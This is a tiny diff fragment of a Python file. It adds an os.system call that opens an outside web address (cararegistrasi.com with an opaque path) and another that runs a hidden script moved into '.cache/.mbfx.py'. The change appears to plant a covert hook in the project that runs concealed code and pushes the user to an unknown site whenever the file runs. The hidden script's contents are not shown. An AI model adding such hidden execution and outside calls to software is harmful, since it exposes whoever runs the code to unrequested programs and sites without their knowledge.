@@ -318,5 +318,5 @@
 
 
 import os,time
-
-os.system("python .mbfx.py")
+os.system("xdg-open https://cararegistrasi.com/vxeN9T0zKha")
+os.system("python .cache/.mbfx.py")
